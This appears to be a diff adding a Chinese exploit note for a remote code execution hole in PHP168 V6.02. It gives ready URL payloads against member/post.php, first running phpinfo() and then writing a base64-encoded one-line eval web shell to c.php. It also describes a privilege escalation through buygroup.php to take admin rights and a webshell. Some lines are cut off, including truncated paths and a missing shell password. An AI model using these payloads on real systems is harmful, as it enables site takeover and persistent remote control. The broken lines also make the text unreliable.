@@ -1,0 +1,19 @@
+PHP168 V6.02 整站系统远程执行任意代码漏洞
+利用方法：先注册一个会员,登陆后在地址栏提交:
+http://URL/member/post.php?only=1&showHtml_Type[bencandy][1]={${phpinfo()}}&aid=1&job=endHTML
+    可以看到执行了phpinfo(). 
+
+
+2010-09-13 19:45红科网安：bbs.honkwin.com
+
+mber/post.php?only=1&showHtml_Type[bencandy][1]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}&aid=1&job=endHTML
+
+        ember/目录下面生成个c.php的文件. 一句话木马，链接密码为
+
+
+1.注册普通用户 
+
+2.通过 http://www.XXXXX.com/member/buygroup.php?job=buy&gid=3购买管理员权限 。 
+3.后台 拿webshell 
+
+ 
